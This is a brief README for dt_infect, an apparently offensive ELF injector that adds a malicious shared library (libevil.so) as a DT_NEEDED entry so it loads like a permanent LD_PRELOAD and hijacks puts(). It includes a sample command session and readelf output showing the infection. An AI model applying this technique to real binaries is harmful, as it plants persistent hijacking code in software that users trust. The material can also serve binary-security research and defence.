# dt_infect
```
ELF Shared library injector using DT_NEEDED precedence infection. Acts as a permanent LD_PRELOAD
```

# Example
```
-- Inject libevil.so into test, and hijack puts()

$ ./inject libevil.so test
Updating .dynstr section
Modified d_entry.value of DT_STRTAB to: 3ff040 (index: 9)
Successfully injected 'libevil.so' into target: 'test'. Make sure to move 'libevil.so' into one of the shared object search paths, i.e. /lib/x86_64-gnu-linux/
$ readelf -d test | grep NEEDED
 0x0000000000000001 (NEEDED)             Shared library: [libevil.so]
 0x0000000000000001 (NEEDED)             Shared library: [libc.so.6]
$ ./test
D0n'7 1nf3c7 m3 pl3453
```

